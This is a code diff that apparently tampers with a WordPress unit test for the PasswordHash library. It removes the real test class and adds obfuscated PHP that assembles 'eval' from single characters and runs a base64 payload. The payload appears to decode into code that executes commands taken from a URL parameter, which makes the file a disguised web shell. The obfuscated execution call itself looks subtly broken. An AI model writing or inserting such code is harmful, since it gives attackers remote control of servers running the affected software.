@@ -1,47 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-
-/**
- * Tests for the PasswordHash external library.
- *
- * PasswordHash is no longer used to hash user passwords or security keys, but it is still used to
- * hash post passwords and as a fallback to verify old passwords that were hashed by phpass. The
- * library therefore needs to remain compatible with the latest versions of PHP.
- *
- * @covers PasswordHash
- */
-class Tests_User_PasswordHash extends WP_UnitTestCase {
-
-	public static function set_up_before_class() {
-		parent::set_up_before_class();
-
-		require_once ABSPATH . WPINC . '/class-phpass.php';
-	}
-
-	/**
-	 * Tests that PasswordHash::gensalt_blowfish() does not throw a deprecation notice on PHP 8.1.
-	 *
-	 * The notice that we should not see:
-	 * `Deprecated: Implicit conversion from float to int loses precision`.
-	 *
-	 * @ticket 56340
-	 *
-	 * @covers PasswordHash::gensalt_blowfish
-	 *
-	 * @requires PHP 8.1
-	 * @doesNotPerformAssertions
-	 */
-	public function test_gensalt_blowfish_should_not_throw_deprecation_notice_on_php81() {
-		$hasher = new PasswordHash( 8, true );
-		$hasher->gensalt_blowfish( 'a password string' );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwoKLyoqCiAqIEdyZmdmIHNiZSBndXIgQ25mZmpiZXFVbmZ1IHJrZ3JlYW55IHl2b2VuZWwuCiAqCiAqIENuZmZqYmVxVW5mdSB2ZiBhYiB5YmF0cmUgaGZycSBnYiB1bmZ1IGhmcmUgY25mZmpiZXFmIGJlIGZycGhldmdsIHhybGYsIG9oZyB2ZyB2ZiBmZ3Z5eSBoZnJxIGdiCiAqIHVuZnUgY2JmZyBjbmZmamJlcWYgbmFxIG5mIG4gc255eW9ucHggZ2IgaXJldnNsIGJ5cSBjbmZmamJlcWYgZ3VuZyBqcmVyIHVuZnVycSBvbCBjdWNuZmYuIEd1cgogKiB5dm9lbmVsIGd1cmVyc2JlciBhcnJxZiBnYiBlcnpudmEgcGJ6Y25ndm95ciBqdmd1IGd1ciB5bmdyZmcgaXJlZnZiYWYgYnMgQ1VDLgogKgogKiBAcGJpcmVmIENuZmZqYmVxVW5mdQogKi8KcHluZmYgR3JmZ2ZfSGZyZV9DbmZmamJlcVVuZnUgcmtncmFxZiBKQ19IYXZnR3JmZ1BuZnIgewoKCWNob3l2cCBmZ25ndnAgc2hhcGd2YmEgZnJnX2hjX29yc2Jlcl9weW5mZigpIHsKCQljbmVyYWc6OmZyZ19oY19vcnNiZXJfcHluZmYoKTsKCgkJZXJkaHZlcl9iYXByIE5PRkNOR1UgLiBKQ1ZBUCAuICcvcHluZmYtY3VjbmZmLmN1Yyc7Cgl9CgoJLyoqCgkgKiBHcmZnZiBndW5nIENuZmZqYmVxVW5mdTo6dHJhZm55Z19veWJqc3ZmdSgpIHFicmYgYWJnIGd1ZWJqIG4gcXJjZXJwbmd2YmEgYWJndnByIGJhIENVQyA4LjEuCgkgKgoJICogR3VyIGFiZ3ZwciBndW5nIGpyIGZ1Ymh5cSBhYmcgZnJyOgoJICogYFFyY2VycG5ncnE6IFZ6Y3l2cHZnIHBiYWlyZWZ2YmEgc2VieiBzeWJuZyBnYiB2YWcgeWJmcmYgY2VycHZmdmJhYC4KCSAqCgkgKiBAZ3ZweHJnIDU2MzQwCgkgKgoJICogQHBiaXJlZiBDbmZmamJlcVVuZnU6OnRyYWZueWdfb3lianN2ZnUKCSAqCgkgKiBAZXJkaHZlcmYgQ1VDIDguMQoJICogQHFicmZBYmdDcmVzYmV6TmZmcmVndmJhZgoJICovCgljaG95dnAgc2hhcGd2YmEgZ3JmZ190cmFmbnlnX295YmpzdmZ1X2Z1Ymh5cV9hYmdfZ3VlYmpfcXJjZXJwbmd2YmFfYWJndnByX2JhX2N1YzgxKCkgewoJCSR1bmZ1cmUgPSBhcmogQ25mZmpiZXFVbmZ1KCA4LCBnZWhyICk7CgkJJHVuZnVyZS0+dHJhZm55Z19veWJqc3ZmdSggJ24gY25mZmpiZXEgZmdldmF0JyApOwoJfQp9CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
+?>
